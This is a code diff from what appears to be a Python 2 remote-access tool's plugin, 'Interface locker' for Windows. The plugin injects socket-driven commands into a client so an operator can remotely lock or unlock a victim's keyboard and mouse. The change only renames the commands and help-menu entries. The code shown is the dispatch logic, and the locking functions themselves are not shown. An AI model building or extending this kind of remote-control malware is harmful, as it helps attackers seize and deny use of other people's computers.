@@ -48,34 +48,34 @@ def mouse_lock():
 def interface_locker(data):
     global keylock
     global mouselock
-    if data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'key' and keylock:
+    if data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key' and keylock:
         s.sendall('[-]Keyboard is already locked')
-    elif data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'mouse' and mouselock:
+    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse' and mouselock:
         s.sendall('[-]Mouse is already locked')
-    elif data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'key':
+    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key':
         keylock = True
         t = threading.Thread(target=key_lock,args=(),)
         t.start()
         s.sendall('[+]Locked keyboard interface')
-    elif data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'mouse':
+    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse':
         mouselock = True
         t = threading.Thread(target=mouse_lock,args=(),)
         t.start()
         s.sendall('[+]Locked mouse interface')
-    elif data.split(' ')[0] == 'unlock' and data.split(' ')[1] == 'key':
+    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'key':
         keylock = False
         s.sendall('[+]Unlocked keyboard interface')
-    elif data.split(' ')[0] == 'unlock' and data.split(' ')[1] == 'mouse':
+    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'mouse':
         mouselock = False
         s.sendall('[+]Unlocked mouse interface')
     else:
         s.sendall('[-]Please specify valid interface, key/mouse, to lock/unlock')''')
         config.logics.append('''
-            elif command in ('lock','unlock'):
+            elif command in ('inter_lock','inter_unlock'):
                 interface_locker(data)
                 ''')
-        config.help_menu['lock <key/mouse>'] = 'Disable the keyboard or mouse interface'
-        config.help_menu['unlock <key/mouse>'] = 'Enable the keyboard or mouse interface'
+        config.help_menu['inter_lock <key/mouse>'] = 'Disable the keyboard or mouse interface'
+        config.help_menu['inter_unlock <key/mouse>'] = 'Enable the keyboard or mouse interface'
     elif option == 'info':
         print '\nName             : Interface locker' \
               '\nOS               : Windows' \
